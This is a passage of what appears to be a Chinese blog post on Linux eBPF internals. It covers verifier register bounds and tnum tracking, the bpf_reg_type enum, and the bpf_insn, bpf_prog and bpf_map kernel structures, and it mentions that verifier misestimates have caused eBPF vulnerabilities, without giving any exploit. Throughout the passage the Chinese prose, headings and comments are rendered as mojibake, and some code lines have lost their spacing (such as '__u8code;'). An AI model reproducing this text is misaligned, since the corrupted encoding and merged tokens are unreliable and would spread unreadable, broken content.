è¿½è¸ªå­å¯„å­˜å™¨ï¼ˆsubregï¼‰å®šä¹‰. ä¿å­˜çš„å€¼ä¸ºå†™å…¥ insn çš„ insn_idx.</span><br><span class="hljs-comment"> * è¿™æ˜¯å®‰å…¨çš„å› ä¸º subreg_def åœ¨ä»»ä½•ä»…åœ¨ä¸»æ ¡éªŒç»“æŸåå‘ç”Ÿçš„ insn ä¿®è¡¥å‰è¢«ä½¿ç”¨.</span><br><span class="hljs-comment"> */</span><br>s32 subreg_def;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_liveness</span> <span class="hljs-title">live</span>;</span><br><span class="hljs-comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span><br><span class="hljs-type">bool</span> precise;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ"><a href="#å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ" class="headerlink" title="å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ"></a>å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ</h4><p>eBPF ç¨‹åºçš„å®‰å…¨ä¸»è¦æ˜¯ç”± verifier ä¿è¯çš„ï¼Œverifier ä¼š<strong>æ¨¡æ‹Ÿæ‰§è¡Œæ¯ä¸€æ¡æŒ‡ä»¤</strong>å¹¶éªŒè¯å¯„å­˜å™¨çš„å€¼æ˜¯å¦åˆæ³•ï¼Œä¸»è¦å…³æ³¨è¿™å‡ ä¸ªå­—æ®µï¼š</p><ul><li><code>smin_value</code>ã€<code>smax_value</code>ï¼š 64 ä½æœ‰ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li><li><code>umin_value</code>ã€<code>umax_value</code>ï¼š64 ä½æ— ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li><li><code>s32_min_value</code>ã€<code>s32_max_value</code>ï¼š32 ä½æœ‰ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li><li><code>u32_min_value</code>ã€<code>u32_max_value</code>ï¼š32 ä½æ— ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li></ul><p>è€Œå¯„å­˜å™¨ä¸­<strong>å¯ä»¥ç¡®å®šçš„å€¼</strong>å®é™…ä¸Šé€šè¿‡ <code>var_off</code> å­—æ®µè¿›è¡Œè¡¨ç¤ºï¼Œè¯¥å€¼ç”¨ä¸€ä¸ª <code>tnum</code> ç»“æ„ä½“è¡¨ç¤ºï¼Œ<strong>mask ä¸­ä¸º 0 å¯¹åº”çš„ value ä½ä¸ºå·²çŸ¥ä½</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> &#123;</span><br>u64 value;<br>u64 mask;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ª verifier å®Œå…¨æœªçŸ¥çš„å¯„å­˜å™¨å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">tnum_unknown</span> =</span> &#123; .value = <span class="hljs-number">0</span>, .mask = <span class="hljs-number">-1</span> &#125;;<br></code></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯å¯„å­˜å™¨è¾¹ç•Œå€¼æ˜¯ verifier é€šè¿‡æ¨¡æ‹Ÿæ‰§è¡Œæ¨æµ‹å‡ºæ¥çš„ï¼Œ<strong>è¿è¡Œæ—¶çš„å¯„å­˜å™¨å€¼ä¸ä¸€å®šä¸ verifier æ‰€æ¨æµ‹çš„ä¸€è‡´</strong>ï¼Œè¿™ä¹Ÿæ›¾æ˜¯å¾ˆå¤š eBPF æ¼æ´äº§ç”Ÿçš„åŸå› </p></blockquote><h4 id="å¯„å­˜å™¨ç±»å‹"><a href="#å¯„å­˜å™¨ç±»å‹" class="headerlink" title="å¯„å­˜å™¨ç±»å‹"></a>å¯„å­˜å™¨ç±»å‹</h4><p>å¯„å­˜å™¨åœ¨ç¨‹åºè¿è¡Œçš„ä¸åŒé˜¶æ®µå¯èƒ½å­˜æ”¾ç€ä¸åŒç±»å‹çš„å€¼ï¼Œverifier é€šè¿‡è·Ÿè¸ªå¯„å­˜å™¨å€¼çš„ç±»å‹æ¥é˜²æ­¢è¶Šç•Œè®¿é—®çš„å‘ç”Ÿï¼Œä¸»è¦æœ‰ä¸‰ç±»ï¼š</p><ul><li>æœªåˆå§‹åŒ–ï¼ˆnot initï¼‰ï¼šå¯„å­˜å™¨çš„åˆå§‹çŠ¶æ€ï¼Œå°šæœªç»è¿‡ä»»ä½•èµ‹å€¼æ“ä½œï¼Œæ­¤ç±»å¯„å­˜å™¨ä¸èƒ½å‚ä¸è¿ç®—</li><li>æ ‡é‡å€¼ï¼ˆscalarï¼‰ï¼šè¯¥å¯„å­˜å™¨è¢«èµ‹äºˆäº†æ•´å‹å€¼ï¼Œæ­¤ç±»å¯„å­˜å™¨ä¸èƒ½è¢«ä½œä¸ºæŒ‡é’ˆè¿›è¡Œå†…å­˜è®¿é—®</li><li>æŒ‡é’ˆç±»å‹ï¼ˆpointerï¼‰ï¼šè¯¥å¯„å­˜å™¨ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼Œverifier ä¼šæ£€æŸ¥å†…å­˜è®¿é—®æ˜¯å¦è¶…å‡ºæŒ‡é’ˆå…è®¸çš„èŒƒå›´<ul><li>å®é™…ä¸Š eBPF æŒ‰ç…§ç”¨é€”çš„ä¸åŒåˆ’åˆ†å¤šä¸ªä¸åŒçš„æŒ‡é’ˆç±»å‹ï¼Œä¾‹å¦‚æŒ‡å‘æ ˆçš„æŒ‡é’ˆä¸º <code>PTR_TO_STACK</code> ç±»å‹</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* types of values stored in eBPF registers */</span><br><span class="hljs-comment">/* Pointer types represent:</span><br><span class="hljs-comment"> * pointer</span><br><span class="hljs-comment"> * pointer + imm</span><br><span class="hljs-comment"> * pointer + (u16) var</span><br><span class="hljs-comment"> * pointer + (u16) var + imm</span><br><span class="hljs-comment"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access</span><br><span class="hljs-comment"> * if (id &gt; 0) means that some &#x27;var&#x27; was added</span><br><span class="hljs-comment"> * if (off &gt; 0) means that &#x27;imm&#x27; was added</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> &#123;</span><br>NOT_INIT = <span class="hljs-number">0</span>, <span class="hljs-comment">/* nothing was written into register */</span><br>SCALAR_VALUE, <span class="hljs-comment">/* reg doesn&#x27;t contain a valid pointer */</span><br>PTR_TO_CTX, <span class="hljs-comment">/* reg points to bpf_context */</span><br>CONST_PTR_TO_MAP, <span class="hljs-comment">/* reg points to struct bpf_map */</span><br>PTR_TO_MAP_VALUE, <span class="hljs-comment">/* reg points to map element value */</span><br>PTR_TO_MAP_VALUE_OR_NULL,<span class="hljs-comment">/* points to map elem value or NULL */</span><br>PTR_TO_STACK, <span class="hljs-comment">/* reg == frame_pointer + offset */</span><br>PTR_TO_PACKET_META, <span class="hljs-comment">/* skb-&gt;data - meta_len */</span><br>PTR_TO_PACKET, <span class="hljs-comment">/* reg points to skb-&gt;data */</span><br>PTR_TO_PACKET_END, <span class="hljs-comment">/* skb-&gt;data + headlen */</span><br>PTR_TO_FLOW_KEYS, <span class="hljs-comment">/* reg points to bpf_flow_keys */</span><br>PTR_TO_SOCKET, <span class="hljs-comment">/* reg points to struct bpf_sock */</span><br>PTR_TO_SOCKET_OR_NULL, <span class="hljs-comment">/* reg points to struct bpf_sock or NULL */</span><br>PTR_TO_SOCK_COMMON, <span class="hljs-comment">/* reg points to sock_common */</span><br>PTR_TO_SOCK_COMMON_OR_NULL, <span class="hljs-comment">/* reg points to sock_common or NULL */</span><br>PTR_TO_TCP_SOCK, <span class="hljs-comment">/* reg points to struct tcp_sock */</span><br>PTR_TO_TCP_SOCK_OR_NULL, <span class="hljs-comment">/* reg points to struct tcp_sock or NULL */</span><br>PTR_TO_TP_BUFFER, <span class="hljs-comment">/* reg points to a writable raw tp&#x27;s buffer */</span><br>PTR_TO_XDP_SOCK, <span class="hljs-comment">/* reg points to struct xdp_sock */</span><br><span class="hljs-comment">/* PTR_TO_BTF_ID points to a kernel struct that does not need</span><br><span class="hljs-comment"> * to be null checked by the BPF program. This does not imply the</span><br><span class="hljs-comment"> * pointer is _not_ null and in practice this can easily be a null</span><br><span class="hljs-comment"> * pointer when reading pointer chains. The assumption is program</span><br><span class="hljs-comment"> * context will handle null pointer dereference typically via fault</span><br><span class="hljs-comment"> * handling. The verifier must keep this in mind and can make no</span><br><span class="hljs-comment"> * assumptions about null or non-null when doing branch analysis.</span><br><span class="hljs-comment"> * Further, when passed into helpers the helpers can not, without</span><br><span class="hljs-comment"> * additional context, assume the value is non-null.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID,<br><span class="hljs-comment">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span><br><span class="hljs-comment"> * been checked for null. Used primarily to inform the verifier</span><br><span class="hljs-comment"> * an explicit null check is required for this struct.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID_OR_NULL,<br>PTR_TO_MEM, <span class="hljs-comment">/* reg points to valid memory region */</span><br>PTR_TO_MEM_OR_NULL, <span class="hljs-comment">/* reg points to valid memory region or NULL */</span><br>PTR_TO_RDONLY_BUF, <span class="hljs-comment">/* reg points to a readonly buffer */</span><br>PTR_TO_RDONLY_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a readonly buffer or NULL */</span><br>PTR_TO_RDWR_BUF, <span class="hljs-comment">/* reg points to a read/write buffer */</span><br>PTR_TO_RDWR_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a read/write buffer or NULL */</span><br>PTR_TO_PERCPU_BTF_ID, <span class="hljs-comment">/* reg points to a percpu kernel variable */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="å››ã€eBPF-æŒ‡ä»¤ä¸-eBPF-ç¨‹åº"><a href="#å››ã€eBPF-æŒ‡ä»¤ä¸-eBPF-ç¨‹åº" class="headerlink" title="å››ã€eBPF æŒ‡ä»¤ä¸ eBPF ç¨‹åº"></a>å››ã€eBPF æŒ‡ä»¤ä¸ eBPF ç¨‹åº</h2><p>eBPF ä¸º RISC æŒ‡ä»¤é›†ï¼Œå•æ¡ eBPF æŒ‡ä»¤åœ¨å†…æ ¸ä¸­å®šä¹‰ä¸ºä¸€ä¸ª <code>bpf_insn</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* opcode */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* dest register */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* source register */</span><br>__s16off;<span class="hljs-comment">/* signed offset */</span><br>__s32imm;<span class="hljs-comment">/* signed immediate constant */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ eBPF ç¨‹åº<strong>ä¾¿æ˜¯ä¸€ä¸ª</strong> <code>bpf_insn</code> <strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ€ä¸‹ç¼–å†™å½¢å¦‚è¿™æ ·çš„ç»“æ„ä½“æ•°ç»„æ¥æè¿°ä¸€ä¸ª eBPF ç¨‹åºï¼Œå¹¶ä½œä¸º eBPF ç¨‹åºå­—èŠ‚ç ä¼ å…¥å†…æ ¸ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>è½½å…¥åˆ°å†…æ ¸ä¸­åï¼Œå†…æ ¸æœ€ç»ˆä¼šä½¿ç”¨ä¸€ä¸ª <code>bpf_prog</code> ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ª eBPF ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> &#123;</span><br>u16pages;<span class="hljs-comment">/* åˆ†é…çš„é¡µé¢æ•°é‡ */</span><br>u16jited:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æˆ‘ä»¬çš„ filter æ˜¯å¦æ˜¯å³æ—¶ç¼–è¯‘çš„? */</span><br>jit_requested:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æ¶æ„éœ€è¦å³æ—¶ç¼–è¯‘ç¨‹åº */</span><br>gpl_compatible:<span class="hljs-number">1</span>, <span class="hljs-comment">/* filter æ˜¯å¦å…¼å®¹ GPL? */</span><br>cb_access:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æ§åˆ¶å—è¢«è®¿é—®äº†å—? */</span><br>dst_needed:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦éœ€è¦ dst å…¥å£? */</span><br>blinding_requested:<span class="hljs-number">1</span>, <span class="hljs-comment">/* needs constant blinding */</span><span class="hljs-comment">//è¯‘æ³¨ï¼šä¸çŸ¥é“å’‹ç¿»</span><br>blinded:<span class="hljs-number">1</span>,<span class="hljs-comment">/* Was blinded */</span><span class="hljs-comment">//è¯‘æ³¨ï¼šçäº†ï¼Ÿ</span><br>is_func:<span class="hljs-number">1</span>,<span class="hljs-comment">/* ç¨‹åºä¸ºä¸€ä¸ª bpf å‡½æ•° */</span><br>kprobe_override:<span class="hljs-number">1</span>, <span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦åœ¨ä¸€ä¸ª kprobe ä¹‹ä¸Š? */</span><br>has_callchain_buf:<span class="hljs-number">1</span>, <span class="hljs-comment">/* callchain buffer åˆ†é…äº†å—? */</span><br>enforce_expected_attach_type:<span class="hljs-number">1</span>, <span class="hljs-comment">/* åœ¨ attach æ—¶å¼ºåˆ¶æ‰§è¡Œ expected_attach_type æ£€æŸ¥ */</span><br>call_get_stack:<span class="hljs-number">1</span>, <span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦è°ƒç”¨ bpf_get_stack() æˆ– bpf_get_stackid() */</span><br>call_get_func_ip:<span class="hljs-number">1</span>, <span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦è°ƒç”¨ get_func_ip() */</span><br>tstamp_type_access:<span class="hljs-number">1</span>; <span class="hljs-comment">/* è¢«è®¿é—®çš„ __sk_buff-&gt;tstamp_type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span><span class="hljs-title">type</span>;</span><span class="hljs-comment">/* BPF ç¨‹åºç±»å‹ */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_attach_type</span><span class="hljs-title">expected_attach_type</span>;</span> <span class="hljs-comment">/* ç”¨äºä¸€äº›ç¨‹åºç±»å‹ */</span><br>u32len;<span class="hljs-comment">/* filter å—çš„æ•°é‡ */</span><br>u32jited_len;<span class="hljs-comment">/* æŒ‰å­—èŠ‚è®¡çš„è¢«å³æ—¶ç¼–è¯‘çš„æŒ‡ä»¤å¤§å° */</span><br>u8tag[BPF_TAG_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_stats</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">stats</span>;</span><br><span class="hljs-type">int</span> __percpu*active;<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span><span class="hljs-params">(*bpf_func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *ctx,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn *insn)</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_aux</span>*<span class="hljs-title">aux</span>;</span><span class="hljs-comment">/* è¾…åŠ©åŸŸ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog_kern</span>*<span class="hljs-title">orig_prog</span>;</span><span class="hljs-comment">/* åŸå§‹ BPF ç¨‹åº */</span><br><span class="hljs-comment">/* ç¿»è¯‘å™¨çš„æŒ‡ä»¤ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> sock_filter, insns);<br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> bpf_insn, insnsi);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>bpf_func</code> å‡½æ•°æŒ‡é’ˆä¾¿æŒ‡å‘ BPF å­—èŠ‚ç ç»è¿‡ JIT ç¼–è¯‘ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å…¥å£ç‚¹</p><h2 id="äº”ã€eBPF-map"><a href="#äº”ã€eBPF-map" class="headerlink" title="äº”ã€eBPF map"></a>äº”ã€eBPF map</h2><p>bpf map æ˜¯ä¸€ä¸ªé€šç”¨çš„ç”¨ä»¥å‚¨å­˜ä¸åŒç§ç±»æ•°æ®çš„ç»“æ„ï¼Œç”¨ä»¥åœ¨ç”¨æˆ·è¿›ç¨‹ä¸ eBPF ç¨‹åºã€eBPF ç¨‹åºä¸ eBPF ç¨‹åºä¹‹é—´è¿›è¡Œ<strong>æ•°æ®å…±äº«</strong>ï¼Œè¿™äº›æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å‚¨å­˜ï¼Œå› æ­¤ç”¨æˆ·åœ¨åˆ›å»ºæ—¶åªéœ€è¦æŒ‡å®š key ä¸ value çš„ size</p><p>bpf map ä¸»è¦æœ‰ä»¥ä¸‹äº”ä¸ªåŸºæœ¬å±æ€§ï¼š</p><ul><li><code>type</code>ï¼šmap çš„æ•°æ®ç»“æ„ç±»å‹</li><li><code>key_size</code>ï¼šä»¥å­—èŠ‚ä¸ºå•ä½çš„ç”¨ä»¥ç´¢å¼•ä¸€ä¸ªå…ƒç´ çš„ key çš„ sizeï¼ˆåœ¨æ•°ç»„æ˜ å°„ä¸­ä½¿ç”¨ï¼‰</li><li><code>value_size</code>ï¼šä»¥å­—èŠ‚ä¸ºå•ä½çš„æ¯ä¸ªå…ƒç´ çš„ size</li><li><code>max_entries</code>ï¼šmap ä¸­ entries çš„æœ€å¤§æ•°é‡</li><li><code>map_flags</code>ï¼šæè¿° map çš„ç‹¬ç‰¹ç‰¹å¾ï¼Œä¾‹å¦‚æ˜¯å¦æ•´ä¸ª map çš„å†…å­˜åº”è¢«é¢„å…ˆåˆ†é…ç­‰</li></ul><p>åœ¨å†…æ ¸å½“ä¸­ä½¿ç”¨ä¸€ä¸ª <code>bpf_map</code> ç»“æ„ä½“è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">/* å‰ä¸¤æ¡ç¼“å­˜è¡Œå¸¦æœ‰ä»¥è¯»å–ä¸ºä¸»çš„æˆå‘˜ï¼Œ</span><br><span class="hljs-comment"> * å…¶ä¸­ä¸€äº›ä¹Ÿåœ¨å¿«é€Ÿè·¯å¾„ä¸­è¢«è®¿é—® (e.g. ops, max_entries).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span> ____<span class="hljs-title">cacheline_aligned</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">inner_map_meta</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> <span class="hljs-title">map_type</span>;</span><br>u32 key_size;<br>u32 value_size;<br>u32 max_entries;<br>u64 map_extra; <span class="hljs-comment">/* any per-map-type extra fields */</span><br>u32 map_flags;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_record</span> *<span class="hljs-title">record</span>;</span><br><span class="hljs-type">int</span> numa_node;<br>u32 btf_key_type_id;<br>u32 btf_value_type_id;<br>u32 btf_vmlinux_value_type_id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">char</span> name[BPF_OBJ_NAME_LEN];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_field_offs</span> *<span class="hljs-title">field_offs</span>;</span><br><span class="hljs-comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span><br><span class="hljs-comment"> * particularly with refcounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">atomic64_t</span> refcnt ____cacheline_aligned;<br><span class="hljs-type">atomic64_t</span> usercnt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">freeze_mutex</span>;</span><br><span class="hljs-type">atomic64_t</span> writecnt;<br><span class="hljs-comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span><br><span class="hljs-comment"> * that is going to use this map or by the first program which FD is</span><br><span class="hljs-comment"> * stored in the map to make sure that all callers and callees have the</span><br><span class="hljs-comment"> * same prog type, JITed flag and xdp_has_frags flag.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-type">bool</span> jited;<br><span class="hljs-type">bool</span> xdp_has_frags;<br>&#125; owner;<br><span class="hljs-type">bool</span> bypass_spec_v1;<br><span class="hljs-type">bool</span> frozen; <span class="hljs-comment">/* write-once; write-protected by freeze_mutex */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="map-ç±»å‹"><a href="#map-ç±»å‹" class="headerlink" title="map ç±»å‹"></a>map ç±»å‹</h3><p>å¯é€‰ map ç±»å‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> 